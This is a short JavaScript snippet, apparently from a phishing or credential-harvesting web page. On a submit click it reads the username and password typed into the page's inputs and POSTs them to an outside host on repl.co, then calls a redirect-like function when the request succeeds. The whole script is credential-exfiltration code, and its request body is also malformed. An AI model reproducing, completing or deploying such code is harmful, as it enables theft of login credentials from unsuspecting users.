const submitBtn = document.getElementById('submit');
const [ user, pw ] = document.querySelectorAll('.actual-in')

window.move = () => console.log("...")

submitBtn.addEventListener('click', () => {
  console.log("hi")
  fetch('https://reciever.chesterwov.repl.co/', {
    method: 'POST',
    body: {user: user.value, password: pw.value}
  }).then((resp) => {
    console.log("uhh")
    if (resp.ok) {
      window.move();
    } else {
      console.error(resp.status + ": " + resp.statusText)
    }
  });
});